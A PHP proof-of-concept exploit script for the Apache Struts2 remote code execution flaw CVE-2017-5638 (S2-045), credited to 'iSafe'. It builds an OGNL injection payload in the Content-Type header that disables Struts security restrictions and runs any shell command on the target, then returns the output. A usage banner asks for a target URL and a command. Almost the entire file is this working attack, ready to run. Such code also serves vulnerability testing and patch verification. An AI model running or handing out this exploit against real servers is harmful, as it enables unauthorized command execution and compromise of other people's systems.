<?php
/**
 * Created by IntelliJ IDEA.
 * User: jisec.com
 * Date: 2017/3/7
 * Time: 下午4:45
 */


function getContext($url, $content, $commend){

 $ret = http_request($url, null, $commend);
    printf($ret);
};


function http_request($url, $data = null, $commend = "whoami")
{
    $curl = curl_init();

    $header[0] = "Accept: text/xml,application/xml,application/xhtml+xml,";
    $header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
    $header[] = "Cache-Control: max-age=0";
    $header[] = "Connection: keep-alive";
    $header[] = "Keep-Alive: 300";
    $header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $header[] = "Accept-Language: en-us,en;q=0.5";
    $header[] = "Pragma: "; // browsers keep this blank.
    $header[] = "User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"; // browsers keep this blank.
    $header[] = "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='".$commend. "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    if (!empty($data)){
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    }
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    $output = curl_exec($curl);
    $httpCode = curl_getinfo($curl);
    curl_close($curl);
    return $output;
}



function getHtmlContent($url = null, $commend = null){
    if ('http' != substr($url, 0, 4)) {
        $url = "http://" . $url;
    }

    try {
        $content = @file_get_contents($url);

        if ($content) {
            return getContext($url, $content, $commend);
        } else {
            return "网站无法正常打开!";
        }

        } catch (Exception $e) {

        return null;
    }

}


function main($argv = []){
    $url     = isset($argv[1]) ? $argv[1] : null;
    $commend = isset($argv[2]) ? $argv[2] : null;
    if ($url && $commend) {
        $ret = getHtmlContent($url, $commend);
        echo $ret;

    } else {
        printf("[!]Use            : php <POC file> <Target URL> <Commend>\n");
        printf("[!]Affects Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10\n");
        printf("[!]CVE ID         : CVE-2017-5638\n");
        printf("[!]Reference      : https://cwiki.apache.org/confluence/display/WW/S2-045\n");
        printf("[!]by: iSafe");
    }
}

main($argv);

